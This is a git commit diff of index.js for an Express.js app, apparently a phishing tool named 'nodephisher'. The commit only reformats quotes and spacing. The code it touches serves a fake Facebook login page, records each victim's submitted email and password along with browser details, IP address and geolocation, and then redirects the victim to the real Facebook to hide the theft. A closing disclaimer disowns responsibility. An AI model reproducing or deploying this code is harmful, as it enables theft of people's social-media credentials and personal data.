39e2c9838a245fcca822f18a4c002dbaee553878
sai1004 <saikiran.bavandla@gmail.com>
2020-01-04 10:50:22 +0530

    commit

--- index.js
+++ index.js
@@ -1,55 +1,58 @@
 const express = require("express");
 const os = require("os");
 const app = express();
-const geoip = require('geoip-lite'); // npm install --save geoip-lite
+const geoip = require("geoip-lite"); // npm install --save geoip-lite
 const Sniffr = require("sniffr"); // npm install --save sniffr
-const requestIp = require('request-ip'); // npm install --save request-ip
+const requestIp = require("request-ip"); // npm install --save request-ip
 
-const HOST = process.env.HOST || '0.0.0.0';
+const HOST = process.env.HOST || "0.0.0.0";
 const PORT = process.env.PORT || 3000;
-
 
 app.use(express.urlencoded({ extended: false }));
 
 app.get("/", (req, res) => {
   res.sendFile(__dirname + "/templates/facebook.html");
-
 });
 
 app.post("/facebook", (req, res) => {
   const email = req.body.email;
   const password = req.body.password;
-  const userAgent = req.headers['user-agent'];
+  const userAgent = req.headers["user-agent"];
   const s = new Sniffr();
   s.sniff(userAgent);
   const clientIp = requestIp.getClientIp(req);
   const geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally
   res.statusCode = 200;
-  res.setHeader('Content-Type', 'application/json');
+  res.setHeader("Content-Type", "application/json");
   console.log(
-    '<===========================================================================>',
-    JSON.stringify({
-    email,
-    password,
-    ...s,
-    clientIp,
-    geo
-  }, null, 2));
- 
-  return res.redirect('http://www.facebook.com');
+    "<===========================================================================>",
+    JSON.stringify(
+      {
+        email,
+        password,
+        ...s,
+        clientIp,
+        geo
+      },
+      null,
+      2
+    )
+  );
 
+  return res.redirect("http://www.facebook.com");
 });
 
-app.listen(PORT, HOST , err => {
+app.listen(PORT, HOST, err => {
   if (err) throw err;
 
   console.log(`
 
- _ __   ___   __| | ___ _ __ | |__ (_)___| |__   ___ _ __
-| '_ \ / _ \ / _` |/ _ | '_ \| '_ \| / __| '_ \ / _ | '__|
-| | | | (_) | (_| |  __| |_) | | | | \__ | | | |  __| |
-|_| |_|\___/ \__,_|\___| .__/|_| |_|_|___|_| |_|\___|_|
-                       |_|
+   _ __   ___   __| | ___ _ __ | |__ (_)___| |__   ___ _ __
+  | |_ \ / _ \ / _| |/ _ | '_ \| '_ \| / __| '_ \ / _ | '__|
+  | | | | (_) | (_| |  __| |_) | | | | \__ | | | |  __| |
+  |_| |_|\___/ \__,_|\___| .__/|_| |_|_|___|_| |_|\___|_|
+                         |_|
+ 
 
   Disclaimer: i'm not responsible for any of your Actions.
   
@@ -58,4 +61,3 @@ app.listen(PORT, HOST , err => {
 
 `);
 });
-
